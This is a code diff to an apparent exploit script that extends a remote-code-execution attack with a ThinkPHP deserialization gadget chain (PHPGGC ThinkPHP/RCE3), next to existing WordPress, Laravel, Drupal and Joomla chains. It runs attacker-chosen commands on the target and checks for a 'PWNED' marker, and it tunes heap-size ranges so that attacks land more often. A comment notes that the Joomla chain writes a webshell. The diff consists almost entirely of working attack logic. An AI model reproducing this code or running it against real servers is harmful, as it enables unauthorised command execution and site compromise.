@@ -535,6 +535,15 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
         OUT_MARKER = f"PWNED{random.randrange(1 << 40):010x}"
         lab.set_gadget("laravel", f"{command};echo {OUT_MARKER}")
         ACTIVE_FILLERS = N_FILLERS
+    elif chain == "thinkphp":
+        # PHPGGC ThinkPHP/RCE3 from ThinkPHP's own vendor tree
+        # (league/flysystem + think\Validate): Psr6Cache::__destruct ->
+        # system("<cmd>;echo <marker>"), marker read from the consumer
+        # response. Bio geometry (ThinkPHP never touches PHP's native
+        # session module, so the default PHPSESSID flow works as-is).
+        OUT_MARKER = f"PWNED{random.randrange(1 << 40):010x}"
+        lab.set_gadget("thinkphp", f"{command};echo {OUT_MARKER}")
+        ACTIVE_FILLERS = N_FILLERS
     elif chain == "joomla":
         # PHPGGC Joomla/FW1 from Joomla's own CMS tree: the consumer's
         # __destruct writes this run's random webshell; the hit signal
@@ -592,12 +601,12 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
     # overlapping), so steering on them thrashes the bracket. The
     # landing is stochastic anyway and the landable band is only
     # ~7MiB of h, so sample the whole plausible range uniformly.
-    # Laravel and Drupal measure the same way (at one h both "early"
-    # and "late" occur across attempts: the reclaimable file-cache
-    # cushion jitters +-5MiB per attempt, wider than the bisection's
-    # h steps - a converged bracket just oscillates between the two
-    # signals).
-    uniform = chain in ("wordpress", "laravel", "drupal")
+    # Laravel, Drupal and ThinkPHP measure the same way (at one h both
+    # "early" and "late" occur across attempts: the reclaimable
+    # file-cache cushion jitters +-5MiB per attempt, wider than the
+    # bisection's h steps - a converged bracket just oscillates
+    # between the signals).
+    uniform = chain in ("wordpress", "laravel", "drupal", "thinkphp")
 
     run_sid = lab.sid_new()   # reused by every attempt (see attempt())
 
@@ -672,6 +681,8 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
                 zone = (38_000_000, 54_000_000)
             elif chain == "drupal":
                 zone = (13_000_000, 23_000_000)
+            elif chain == "thinkphp":
+                zone = (18_000_000, 30_000_000)
             else:
                 zone = (6_000_000, 18_000_000)
             h = random.randint(max(int(h_min), zone[0]),
@@ -701,13 +712,14 @@ def main() -> int:
                    help="maximum interruption attempts (default 40)")
     p.add_argument("--chain",
                    choices=("filecache", "wordpress", "laravel", "drupal",
-                            "joomla"),
+                            "joomla", "thinkphp"),
                    default="filecache",
                    help="planted gadget: the lab's FileCache (default), "
                         "WordPress core (WP_HTML_Token), Laravel's vendor "
                         "tree (PHPGGC Laravel/RCE9), Drupal core "
-                        "(PHPGGC Drupal7/RCE1) or Joomla core "
-                        "(PHPGGC Joomla/FW1)")
+                        "(PHPGGC Drupal7/RCE1), Joomla core "
+                        "(PHPGGC Joomla/FW1) or ThinkPHP's vendor tree "
+                        "(PHPGGC ThinkPHP/RCE3)")
     p.add_argument("-q", "--quiet", action="store_true")
     a = p.parse_args()
 
